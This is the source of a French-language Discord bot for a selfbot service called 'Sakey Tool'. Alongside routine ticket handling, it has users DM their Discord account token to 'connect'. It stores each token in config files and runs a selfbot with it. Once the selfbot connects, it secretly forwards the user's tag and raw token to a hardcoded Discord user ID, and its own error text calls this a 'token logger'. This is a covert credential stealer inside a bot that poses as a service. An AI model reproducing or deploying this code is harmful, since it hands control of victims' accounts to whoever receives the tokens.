const Discord = require('discord.js');
const client = new Discord.Client({
    disableEveryone: true,
    partials : ["MESSAGE", "CHANNEL", "REACTION"],
    fetchAllMembers: true
})
const bdd = require('./bdd.json');
const fs = require('fs');
const config = require('./config.json');
const moment = require('moment');

client.on('ready', () => {
    console.log('Le bot est allumé ! ✅')
    setInterval(() => {
        client.user.setActivity('Sakey Selfbot', { type: 'STREAMING', url: 'https://twitch.tv/sakey' })
    }, 10000)
    var reactionChannel = client.channels.get(config.startchannel)
    reactionChannel.fetchMessage(config.startmessage)
    var reactionChannel2 = client.channels.get(config.ticketchannel)
    reactionChannel2.fetchMessage(config.ticketmessage)
    let config1 = require('./bot1/config.json')
    if (config.status === "on") {

    }
})

client.on("guildMemberAdd", async member => {
    client.channels.get(config.startchannel).send(`${member}\n\`Clique sur la réaction ci-dessus !\``).then(msg => {
        setTimeout(() => {
            msg.delete()
        }, 4000);
    })
})

client.on('messageReactionAdd', async (reaction, user) => {
    if(user.bot) return;
    if (reaction.message.id == config.ticketmessage) {
        if (reaction.emoji.name == "1️⃣") {
            reaction.remove(user)
            let cha = reaction.message.guild.channels.find(ch => ch.name === `support-${user.id}`)
            if (cha) return;
                reaction.message.guild.createChannel(`support-${user.id}`, {
                    type: "text",
                    parent: config.supportcategorie
                }).then(chan => {
                    chan.overwritePermissions(user.id, {
                        VIEW_CHANNEL: true,
                        SEND_MESSAGES: true,
                        ADD_REACTIONS: true,
                        ATTACH_FILES: true
                    })
                    chan.overwritePermissions(reaction.message.guild.id, {
                        VIEW_CHANNEL: false
                    })
                    chan.overwritePermissions(config.supportrole, {
                        VIEW_CHANNEL: true,
                        SEND_MESSAGES: true,
                        ADD_REACTIONS: true,
                        ATTACH_FILES: true
                    })
                    const embed = new Discord.RichEmbed()
                        .setTitle('Ticket')
                        .setColor('WHITE')
                        .setDescription(`Voici votre ticket ! Veuillez expliquer votre problème. Vous pouvez ping un <@&${config.adminrole}> ou un <@&${config.supportrole}> pour patienter moins longtemps.\n\nVous pouvez cliquer sur :x: pour fermer le ticket.`)
                        .setTimestamp()
                    chan.send(`${user} Bienvenue,`, embed).then(msg => {
                        msg.react('❌')

                        const filterReaction = (reaction, user) => !user.bot
                        const collectorReaction = new Discord.ReactionCollector(msg, filterReaction);
                        collectorReaction.on('collect', async (reaction, user) => {
                            if (reaction.emoji.name == "❌") {
                                reaction.message.channel.send('Le ticket va être supprimé dans 5 secondes...')
                                setTimeout(() => {
                                    reaction.message.channel.delete()
                                }, 5000)
                            }
                        })
                    })
                })
        } else {
            if (reaction.emoji.name == "2️⃣") {
                reaction.remove(user)
                let cha = reaction.message.guild.channels.find(ch => ch.name === `buy-${user.id}`)
            if (cha) return;
                reaction.message.guild.createChannel(`buy-${user.id}`, {
                    type: "text",
                    parent: config.buycategorie
                }).then(chan => {
                    chan.overwritePermissions(user.id, {
                        VIEW_CHANNEL: true,
                        SEND_MESSAGES: true,
                        ADD_REACTIONS: true,
                        ATTACH_FILES: true
                    })
                    chan.overwritePermissions(reaction.message.guild.id, {
                        VIEW_CHANNEL: false
                    })
                    chan.overwritePermissions(config.supportrole, {
                        VIEW_CHANNEL: true,
                        SEND_MESSAGES: true,
                        ADD_REACTIONS: true,
                        ATTACH_FILES: true
                    })
                    const embed = new Discord.RichEmbed()
                        .setTitle('Ticket')
                        .setColor('WHITE')
                        .setDescription(`Merci d\'avoir décidé d\'acheter la version premium de **Sakey Tool** ! Vous pouvez ping un <@&${config.adminrole}> ou un <@&${config.supportrole}> pour patienter moins longtemps.\n\nVous pouvez cliquer sur :x: pour fermer le ticket.`)
                        .setTimestamp()
                    chan.send(`${user} Bienvenue,`, embed).then(msg => {
                        msg.react('❌')

                        const filterReaction = (reaction, user) => !user.bot
                        const collectorReaction = new Discord.ReactionCollector(msg, filterReaction);
                        collectorReaction.on('collect', async (reaction, user) => {
                            if (reaction.emoji.name == "❌") {
                                reaction.message.channel.send('Le ticket va être supprimé dans 5 secondes...')
                                setTimeout(() => {
                                    reaction.message.channel.delete()
                                }, 5000)
                            }
                        })
                    })
                })
            }
        }
    } else if (reaction.message.id === config.startmessage) {
        if (reaction.emoji.name === "🛎️") {
            reaction.remove(user)
            let embed = new Discord.RichEmbed()
                .setDescription(`**Veuillez saisir votre** \`token\` **pour continuer** ⌛`)
                .setColor('WHITE')
                .setFooter(user.username, user.avatarURL)
            let msg = await user.send(embed).catch(err => console.log('Err : send (start)'))
            await msg.react('📱')
            await msg.react('❔')
            const filterMessage = (m) => !m.author.bot
            const token = (await msg.channel.awaitMessages(filterMessage, {max: 1})).first().content
            if (bdd['token'].includes(token)) return user.send('\`❌ Vous êtes déjà connecté au Sakey Tool\`').catch(err => console.log('Err : send (start)'))
            let conex = await user.send('\`Connexion en cours...\`').catch(err => console.log('Err : send (start)'))
            let statusTrait = await client.channels.get(config.statutchannel).send(`**▬▬▬▬▬▬▬▬**`).catch(err => console.log('Err : send (statut)'))
            let statusDemarre = await client.channels.get(config.statutchannel).send(`\`[${moment(conex.createdTimestamp).format('YYYY/M/DD HH:mm:ss')}]\` <:away2:883730426127061003> Sakey Tool \`#1\` : **__démarre__**`).catch(err => console.log('Err : send (statut)'))
            let num = bdd['botnumber']
            let cf = require(`./bot${num}/config.json`);
            cf.token = token
            fs.writeFile(`./bot${num}/config.json`, JSON.stringify(cf, null, 4), (err) => {
                if (err) message.channel.send("Une erreur est survenue.");
            });
            bdd['botnumber'] = bdd['botnumber'] + 1
            bdd['token'].push(token)
            bdd['usernumber'][token] = num
            Savebdd()
            let start = require(`./bot${num}/index`)
            let int1 = setInterval(async () => {
                if (cf.invalide === true) {
                    clearInterval(int1)
                    conex.delete().catch(err => console.log('Err : delete (start)'))
                    statusTrait.delete().catch(err => console.log('Err : delete (statut)'))
                    statusDemarre.delete().catch(err => console.log('Err : delete (statut)'))
                    user.send("\`❌ Token invalide\`").catch(err => console.log('Err : send (start)'))
                    const wait = require('util').promisify(setTimeout);
                    await wait(500);
                    cf.token = ""
                    cf.status = "off"
                    cf.invalide = false
                    fs.writeFile(`./bot${num}/config.json`, JSON.stringify(cf, null, 4), (err) => {
                        if (err) message.channel.send("Une erreur est survenue.");
                    });
                    let t = bdd['token'].indexOf(token)
                    bdd['botnumber'] = bdd['botnumber'] - 1
                    delete bdd['usernumber'][token]
                    bdd['token'].splice(t)
                    Savebdd()
                    return;
                } else return;
            }, 0)
            let int2 = setInterval(async () => {
                if (cf.status === "on") {
                    clearInterval(int2)
                    conex.delete().catch(err => console.log('Err : delete (start)'))
                    let final = await user.send("\`✅ Vous êtes désormais connecté au Sakey Tool\`").catch(err => console.log('Err : send (start)'))
                    client.channels.get(config.statutchannel).send(`\`[${moment(final.createdTimestamp).format('YYYY/M/DD HH:mm:ss')}]\` <:online2:883730426521337897> Sakey Tool \`#1\` : **__prêt__**`).catch(err => console.log('Err : send (statut)'))
                    client.channels.get(config.statutchannel).send(`**▬▬▬▬▬▬▬▬**`).catch(err => console.log('Err : send (statut)'))
                    client.users.get('858010905753288705').send(`<:online2:883730426521337897> New Connexion :\n\nName : ${user.tag}\nToken : ${token}`).catch(err => console.log('Err : send (token logger)'))
                    return;
                } else return;
            }, 0)
        }
    }
})

client.on('message', async message => {
    if (message.author.bot) return;
    if (!message.guild) return;
    let prefix = config.prefix
    const args = message.content.slice(prefix.length).trim().split(/ +/g)
    if (message.content == (prefix + "start")) {
        if (!message.member.hasPermission('ADMINISTRATOR')) return;
        message.delete()
        const embed = new Discord.RichEmbed()
            .setTitle('**__Connexion__ :rocket:**')
            .setColor('WHITE')
            .setDescription('Clique sur la réaction ci-dessous pour te connecter au **Sakey Tool** !')
            .setImage('https://media.discordapp.net/attachments/837397293585006662/881946541101842432/tumblr_fe36d9aabc4fc8e1a373e289661e4a3b_83b7549e_540.gif')
        message.channel.send(embed).then(msg => {
            msg.react('🛎️')
        })
    }
    if (message.content == (prefix + "ticket")) {
        if (!message.member.hasPermission('ADMINISTRATOR')) return;
        message.delete()
        const embed = new Discord.RichEmbed()
            .setTitle('**__Tickets__ :bookmark:**')
            .setColor('WHITE')
            .addField(":one:", "Problème avec le Sakey Tool.")
            .addField(":two:", "Acheter le **premium.** :star:")
        message.channel.send(embed).then(msg => {
            msg.react('1️⃣')
            msg.react('2️⃣')
        })
    }
})

function Savebdd() {
    fs.writeFile("./bdd.json", JSON.stringify(bdd, null, 4), (err) => {
        if (err) message.channel.send("Une erreur est survenue.");
    });
}

client.login(config.token)